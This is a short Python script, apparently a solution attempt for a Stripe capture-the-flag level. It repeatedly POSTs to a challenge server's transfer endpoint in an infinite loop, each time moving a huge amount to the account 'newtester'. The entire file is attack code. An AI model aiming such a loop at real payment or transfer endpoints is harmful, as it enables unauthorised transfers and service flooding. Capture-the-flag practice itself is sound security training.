import urllib, urllib2, requests, sys

url = 'https://level04-4.stripe-ctf.com/user-qqrzpfepbs/transfer'

def go():
    r = requests.post(url, config={'verbose': sys.stderr}, data={'to': 'newtester', 'amount': 32235235235})

while True:
    go()
